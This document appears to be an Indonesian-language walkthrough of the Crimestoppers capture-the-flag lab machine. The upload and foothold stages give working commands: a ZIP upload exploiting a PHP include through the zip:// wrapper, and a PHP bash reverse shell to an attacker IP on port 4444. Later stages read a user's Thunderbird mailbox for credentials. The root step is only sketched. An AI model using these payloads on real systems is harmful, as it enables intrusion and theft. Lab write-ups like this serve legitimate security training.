## **Informasi Mesin**
- **Nama**: Crimestoppers
- **Sistem Operasi**: Linux
- **Tingkat Kesulitan**: Hard
- **Alamat IP**: 10.10.10.80
## **Informasi Mesin**

- **Nama**: Crimestoppers
    
- **Sistem Operasi**: Linux
    
- **Tingkat Kesulitan**: Hard
    
- **Alamat IP**: 10.10.10.80
    

## **Tahap 1: Enumerasi Awal**

### **Directory Enumeration**
```bash
gobuster -u http://10.10.10.80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php

- `/images` (301)
    
- `/index.php` (200)
    
- `/home.php` (200)
    
- `/view.php` (200)
    
- `/common.php` (200)
    
- `/uploads` (301)
    
- `/list.php` (200)
    
- `/upload.php` (200)
    
- `/css` (301)
    
- `/js` (301)
    
- `/javascript` (301)
    
- `/fonts` (301)
  ```
    
### **Endpoint Discovery**

Endpoint upload tersedia di:

```text
http://10.10.10.80/?op=upload
```

**Endpoint terkait:** view, upload, list, index, home

### **File Discovery**

Di `/list` ditemukan file `whiterose.txt` yang berisi:

- Petunjuk penggunaan parameter GET yang rentan
    
- Implikasi chain menuju RCE
    

## **Tahap 2: Analisis Upload & RCE**

### **Token Extraction**

```bash
curl -sD - http://10.10.10.80/?op=upload | grep -e PHPSESSID -e 'name="token"'
```

### **File Upload Exploitation**

Mengunggah file ZIP berisi payload PHP:

```bash
curl -X POST -sD - \
  -F "tip=@shell.zip" \
  -F "name=a" \
  -F "token=<token_value>" \
  -F "submit=Send Tip!" \
  http://10.10.10.80/?op=upload \
  -H "Referer: http://10.10.10.80/?op=upload" \
  -H "Cookie: admin=1; PHPSESSID=<session>"

**Response:** `Location: ?op=view&secretname=<id>`
```

### **RCE via ZIP Wrapper**

Aplikasi melakukan include dinamis berdasarkan parameter `op`:

```php
include $_GET['op'] . '.php';
```

Kombinasi dengan ZIP wrapper memungkinkan RCE:

```text
http://10.10.10.80/?op=zip://uploads/<filename>.zip%23shell
```

## **Tahap 3: Initial Foothold**

### **Reverse Shell**

Membuat payload PHP reverse shell dalam file ZIP:

**shell.php:**

```bash
<?php
system("bash -c 'bash -i >& /dev/tcp/10.10.14.24/4444 0>&1'");
?>
```

**Zip creation:**

```bash
zip shell.zip shell.php
```

### **Execution**

```bash
# Setup listener
nc -lvnp 4444


# Trigger execution via browser or curl
curl "http://10.10.10.80/?op=zip://uploads/shell.zip%23shell"
```


## **Tahap 4: Privilege Escalation ke User Dom**

### **Thunderbird Mail Discovery**

```bash
ls -la /home/dom/.thunderbird/
find /home/dom -name "*.msf" -o -name "Inbox" -o -name "*.mbox"
```

### **Mailbox Extraction**

```bash
# Extract mbox files
cat /home/dom/.thunderbird/*/ImapMail/crimestoppers.htb/Inbox
# atau
cat /home/dom/.thunderbird/*/Mail/Local\ Folders/Inbox
```

### **Credential Discovery**

Dalam email ditemukan kredensial untuk user dom.

### **SSH Access**

```bash
ssh dom@10.10.10.80
# atau
su dom
```

## **Tahap 5: Eskalasi ke Root**

### **FunSociety Endpoint Analysis**

```bash
nc 10.10.10.80 80
GET /FunSociety
```

### **Apache Module Exploitation**

Modul Apache `apache_modrootme` memberikan jalur privilege escalation.

### **Exploit Development**

Berdasarkan analisis email dan log files, modul Apache dapat dieksploitasi untuk mendapatkan root shell.

### **Root Access**

```bash
# Method 1: Via Apache module
echo "FunSociety" | nc localhost 80

# Method 2: Local privilege escalation
./apache_modrootme_exploit
```

### **Root Flag**

```bash
cat /root/root.txt
```